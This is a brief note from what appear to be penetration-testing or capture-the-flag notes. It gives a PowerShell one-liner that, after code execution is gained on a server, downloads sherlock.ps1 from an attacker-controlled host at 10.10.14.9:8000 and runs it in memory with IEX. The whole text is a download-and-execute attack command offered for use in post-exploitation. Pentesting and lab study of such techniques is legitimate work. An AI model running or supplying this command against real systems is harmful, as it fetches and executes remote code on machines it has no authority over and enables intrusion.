* Useful for getting files(especially powershell scripts) ran on the server once you have code execution
	* this one-liner will download the file (sherlock.ps1 in this case) and run it with powershell 
```shell
echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.9:8000/sherlock.ps1") | powershell -noprofile -
```